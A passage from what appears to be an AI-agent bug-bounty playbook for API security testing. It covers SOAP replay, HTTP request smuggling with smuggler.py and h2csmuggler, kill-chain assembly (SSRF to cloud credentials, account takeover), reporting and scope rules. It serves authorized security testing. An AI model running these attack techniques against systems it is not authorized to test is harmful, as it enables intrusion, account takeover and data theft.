- **Procedure:** Replay a captured signed SOAP request with a stale/removed `<wsu:Timestamp>`; tamper a signed element and resend (signature-not-verified); test `UsernameToken` with `PasswordText` over cleartext / weak nonce reuse.
- **Indicators:** Replayed/tampered request accepted; cleartext password token accepted.
- **Validation:** Confirm the action executed after tampering/replay.
- **Severity:** CVSS 3.1 7.5-9.1 (auth bypass / replay).
- **Dispatch:** -> APIAgent.

### 12.3 HTTP request smuggling at the gateway

- **Objective / hypothesis:** The edge and backend disagree on request boundaries (CL.TE / TE.CL / H2.CL / H2.TE) → smuggle a request past front-door auth, poison the socket/cache.
- **Procedure:**
```bash
# Automated detect (timing-based), proxied through Burp for capture:
smuggler.py -u "$API_BASE" --proxy "$PROXY" -m GET,POST | tee "$ART/smuggler.txt"
# H2 downgrade / desync: use Burp "HTTP Request Smuggler" (Albinowax) on the captured request,
# and turbo-intruder single-packet for confirmation. h2csmuggler for cleartext-h2 upgrade:
h2csmuggler -x "$API_BASE" -t /v1/admin/users 2>&1 | tee "$ART/h2csmuggler.txt"
```
- **Indicators:** Differential timing/response indicating a desync; a smuggled prefix reaching an admin route; another user's response captured.
- **Validation:** Reproduce the desync deterministically (single-packet) and demonstrate a concrete effect (auth bypass, captured victim request, cache poison). Smuggling is high-risk to shared infra — confirm minimally and stop.
- **Evasion / edge cases:** Try `Transfer-Encoding` obfuscations (`Transfer-Encoding : chunked`, double TE, casing); H2-specific via `:method`/`:path` and header-injection in pseudo-headers.
- **Severity:** CVSS 3.1 8.6-9.1 (front-door auth bypass / mass cache poison).
- **Dispatch:** -> APIAgent; header/cache leg -> CRLFAgent / CachePoisoningAgent (note for ExploitChainAgent).

**Phase 12 artifacts:** XXE evidence + OOB, WS-Security replay captures, smuggler/h2csmuggler output, `/tmp/bb-findings-{deser,api,crlf}.json`.
**Gate-out:** XML processing and gateway framing tested; positives reproduced and bounded. Advance to reporting.

---

## PHASE 13: REPORTING & HAND-OFF

**Objective:** Aggregate all findings, validate and de-duplicate them, correlate into kill chains, score, and produce the final report plus a concise N-point update of new tests performed.
**Expert rationale:** Raw findings are not a report. ValidatorAgent kills false positives and de-dups by root cause; ExploitChainAgent prices combinations at terminal blast radius. The deliverable is reproducible, scoped, and prioritized.
**Gate-in:** All in-scope phases complete; per-agent `/tmp/bb-findings-*.json` written.

### 13.1 Aggregate

```bash
# Collect every agent's findings + archive into the run dir:
jq -s 'add' /tmp/bb-findings-*.json > "$FIND/all-findings-raw.json"
cp /tmp/bb-findings-*.json "$FIND/" 2>/dev/null || true
echo "raw findings: $(jq 'length' "$FIND/all-findings-raw.json")"
```

### 13.2 Validate (ValidatorAgent)

- **Hand-off:** ValidatorAgent consumes `/tmp/bb-findings-*.json`, then for each finding: clean-room reproduces it (replay the saved request through Burp via `burp-bridge.ts`), kills false positives, de-duplicates by **root cause** (e.g., one missing-authz middleware behind many BOLA endpoints = one finding with N affected endpoints), assigns CVSS 3.1 + 4.0, and applies the hunt-mode severity gate.
```bash
# Reproduce a finding's exact request (proxied + recorded) before it counts as confirmed:
bun "$TOOLS/burp-bridge.ts" --history --filter "status:200" > "$EVID/validator-replays.json"
# ValidatorAgent writes the gated, de-duped set here:
#   /tmp/bb-findings-validator.json   (confirmed:true, cvss31, cvss40, root_cause, affected[])
```
- **De-dup rules:** same type + same endpoint → merge; same type + different params on one endpoint → one finding; same root cause across endpoints → one finding listing all affected; BOLA across many endpoints → single finding, endpoint list.

### 13.3 Correlate into chains (ExploitChainAgent)

- **Hand-off:** ExploitChainAgent consumes `/tmp/bb-findings-validator.json`, models findings as a capability graph, and assembles end-to-end chains where each step's output feeds the next. Each chain ships one combined PoC, MITRE ATT&CK mapping per step, and an elevated CVSS at **terminal** blast radius (chains compose; never average).
- **High-value API chains to assemble:**
  - Open redirect (6.7/OpenRedirect) → reflected `redirect_uri` (2.6) → leaked `code` → token exchange → **account takeover**.
  - BOLA read (3.1) of a privileged object ID → BFLA mutation (3.3) on it → **admin takeover**.
  - SSRF (4.6 / 8.1 / 12.1-XXE) → IMDS credentials → **cloud account access** (→ CloudExploitationAgent).
  - Mass assignment (3.5) `tenant_id`/`role` → cross-tenant data + privilege → **multi-tenant compromise**.
  - Gateway smuggling (12.3) → front-door auth bypass → admin API → **full compromise**.
  - GraphQL batching (9.2) → credential brute-force → valid token → field-authz dump (9.4) → **mass data theft**.

### 13.4 Final report + N-point update

```bash
# Map every confirmed finding to its OWASP API Top 10 (2023) category and emit the report:
jq -r '.[] | "[\(.cvss31)] \(.owasp_api) \(.type) @ \(.endpoint) -> \(.impact)"' /tmp/bb-findings-validator.json \
  | sort -rn | tee "$FIND/report-summary.txt"
# Persist learnings + update orchestrator state:
bun "$TOOLS/hunt-orchestrator.ts" --target "$API_BASE" --phase report --status completed \
  --data "{\"findings\": $(jq 'length' /tmp/bb-findings-validator.json)}"
bun "$TOOLS/hunt-orchestrator.ts" --target "$API_BASE" --workflow-complete
```

- **Concise N-point update of new tests performed:** produce a short numbered list (one line per net-new test class exercised this run), e.g.:
  1. OWASP API Top 10 (2023) full sweep — all 10 categories mapped to phases via the Coverage Matrix.
  2. JWT: alg-confusion / none / kid-injection / jku-x5u spoof / weak-secret / claim+expiry tamper.
  3. OAuth2/OIDC: redirect_uri allow-list bypass, PKCE downgrade, scope/consent, refresh rotation.
  4. Multi-identity BOLA/BFLA/BOPLA matrices (user1/user2/admin) across versions and methods.
  5. Injection: SQLi (sort/order, JSON), NoSQLi (operator/$where/regex), RCE/CMDi (OOB), deserialization (URLDNS gadget), SSRF→IMDS.
  6. API4/API6: rate-limit bypass, payload/pagination exhaustion, cost amplification, sensitive-flow automation, single-packet races.
  7. API8: CORS, verbose errors, actuator/debug, headers, method/verb, content-type confusion, CRLF.
  8. API9: shadow/zombie/deprecated versions, non-prod hosts, doc drift — re-run through authz.
  9. API10: third-party redirect-trust and response-trust boundaries.
  10. Protocols: GraphQL (introspection/batching/depth/field-authz/CSRF), gRPC (reflection/tamper/injection), WebSocket (CSWSH/injection/authn-timing), SOAP/XML (XXE/WS-Security), gateway smuggling.

**Phase 13 artifacts:** `$FIND/all-findings-raw.json`, `/tmp/bb-findings-validator.json`, chain PoCs, `$FIND/report-summary.txt`, final report.
**Gate-out:** Every finding reproduced, de-duped, scored, mapped to OWASP API Top 10, and chained where applicable; report + N-point update delivered.

---

## Agent Coordination

| Agent | Phases | Responsibilities |
|-------|--------|------------------|
| AppReviewAgent | 1 | Inventory, profiling, AppProfile, identity/ID harvest |
| AuthAgent | 2.1-2.5, 2.8-2.9 | API keys, JWT, sessions, gateway bypass |
| OAuthAgent | 2.6-2.7 | OAuth2/OIDC redirect_uri, PKCE, scope, refresh |
| IDORAgent | 3.1-3.4, 7.1 (authz), 9.4, 10.2 | BOLA/BFLA cross-identity matrices |
| APIAgent | 1, 3.5-3.6, 6, 7, 8.2, 10, 12.2-12.3 | BOPLA, misconfig, inventory, gRPC, WS-Security, smuggling |
| SQLiAgent | 4.1, 10.3 | SQL injection |
| NoSQLiAgent | 4.2 | NoSQL injection |
| RCEAgent | 4.3, 10.3 | Eval/template/native exec |
| CommandInjectionAgent | 4.4 | OS command + argument injection |
| DeserializationAgent | 4.5, 12.1 | Insecure deserialization, XXE |
| SSRFAgent | 4.6, 8.1 | SSRF via params and consumed-service trust |
| CRLFAgent | 6.7, 9.5, 12.3 | Header/CRLF injection, smuggling header leg |
| BusinessLogicAgent | 5.1-5.5 | Rate/quota, payload/pagination/cost, sensitive flows |
| RaceConditionAgent | 5.6 | Concurrency/limit-overrun races |
| GraphQLAgent | 9 | GraphQL introspection/batching/depth/field-authz/CSRF |
| WebSocketAgent | 11 | CSWSH, message injection, authn timing |
| ValidatorAgent | 13.2 | Reproduce, de-dup by root cause, CVSS, hunt-mode gate |
| ExploitChainAgent | 13.3 | Kill-chain correlation, combined PoC, elevated CVSS |

## Workflow State Machine

```
IDLE -> INVENTORY -> AUTH -> AUTHZ -> INJECTION -> RESOURCE_FLOWS
  -> MISCONFIG -> INVENTORY_MGMT -> THIRD_PARTY
  -> [GRAPHQL] -> [GRPC] -> [WEBSOCKET] -> [SOAP_GATEWAY]
  -> VALIDATE -> CHAIN -> REPORT -> COMPLETE
```

Conditional branches (entered only if detected in INVENTORY/1.3):
- `[GRAPHQL]` — GraphQL endpoint confirmed
- `[GRPC]` — gRPC reflection / grpc-web confirmed
- `[WEBSOCKET]` — WebSocket handshake confirmed
- `[SOAP_GATEWAY]` — XML/SOAP accepted, or a fronting gateway present (smuggling always checked when an edge exists)

Any phase may flag REPORT early for a critical requiring immediate disclosure; the hunt then resumes.

## Exit Criteria

- Full API surface inventoried (endpoints, methods, params, schemas, versions, protocols) and reconciled against observed traffic.
- Every OWASP API Top 10 (2023) row in the Coverage Matrix exercised by its mapped technique.
- Authentication and authorization tested across user1/user2/admin and across versions/methods.
- Injection testing completed on every typed parameter against its plausible interpreter, with reflected/time/OOB proof.
- Resource-consumption and sensitive-business-flow controls measured (limits, concurrency, cost).
- Protocol-specific phases completed for every detected protocol (GraphQL, gRPC, WebSocket, SOAP/XML) plus gateway smuggling.
- All findings reproduced, de-duped by root cause, CVSS 3.1/4.0 scored, mapped to OWASP API Top 10, and chained where applicable.
- Final report and concise N-point update delivered; orchestrator state set to complete.

---

## Appendix A: Environment Variables

```bash
# Target
API_BASE="https://api.target.com"; API_TARGET="$API_BASE"
TARGET_HOST="api.target.com"; TARGET_SLUG="api-target-com"
GRPC_TARGET="grpc.target.com"; GRPC_PORT="443"; WS_URL="wss://api.target.com/ws"

# Proxy / identity
PROXY="http://127.0.0.1:8080"; BURP_API="http://127.0.0.1:1337/v0.1"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# Identities (hydrated from credential-vault: api-user1 / api-user2 / api-admin / api-anon)
U1=""; U2=""; ADMIN=""; U1_ID=""; U2_ID=""; U1_OBJ=""; U2_OBJ=""

# Output tree (honors `piranha hunt --out <dir>`)
RUN_DIR="${OUT:-$HOME/.claude/MEMORY/BugBounty/Sessions/$TARGET_SLUG}"
ART="$RUN_DIR/artifacts"; FIND="$RUN_DIR/findings"; EVID="$RUN_DIR/evidence"
TOOLS="$HOME/.claude/skills/BugBountyFramework/Tools"
```

## Appendix B: Tool Reference

| Tool | Invocation | Purpose |
|------|-----------|---------|
| hunt-orchestrator.ts | `bun "$TOOLS/hunt-orchestrator.ts" --scope-check <url>` | Phase state, scope guard |
| credential-vault.ts | `bun "$TOOLS/credential-vault.ts" --store/--get/--list` | Multi-identity creds (never inline) |
| auth-manager.ts | `bun "$TOOLS/auth-manager.ts" --target <url> --detect-strategy` | Auth flow + token refresh |
| burp-bridge.ts | `bun "$TOOLS/burp-bridge.ts" --health/--sync-scope/--sitemap/--history/--export-har/--collaborator-poll` | Proxy capture, scope, HAR, OOB |
| playwright-harness.ts | `bun "$TOOLS/playwright-harness.ts" --target <url> --proxy "$PROXY" --mode map-flows` | Real authenticated session + flow map |
| nuclei | `nuclei -u <url> -proxy "$PROXY"` | Exposure/misconfig/CVE templates |
| ffuf | `ffuf -u <url>/FUZZ -x "$PROXY"` | Endpoint/param/credential brute-force |
| sqlmap | `sqlmap -u <url> --proxy="$PROXY"` | SQL injection automation |
| jwt_tool | `python3 jwt_tool.py <jwt> -X a` | JWT attack suite |
| graphw00f / graphql-cop / clairvoyance | per Phase 9 | GraphQL fingerprint / audit / schema recovery |
| grpcurl | `grpcurl -insecure host:port list` | gRPC reflection + calls |
| websocat / wsrepl | per Phase 11 | WebSocket interaction (proxy-aware) |
| smuggler.py / h2csmuggler | per Phase 12.3 | HTTP request smuggling |

## Appendix C: Scope Awareness

```bash
# Before testing ANY discovered host/endpoint:
bun "$TOOLS/hunt-orchestrator.ts" --scope-check "$DISCOVERED_URL"   # IN_SCOPE | OUT_OF_SCOPE
```

Third-party APIs the target consumes (API10) are attacked ONLY at the target-controlled trust boundary — never the third-party service itself. CDNs, identity providers, payment processors, and shared infrastructure are out of scope unless explicitly listed. When in doubt, do not test.
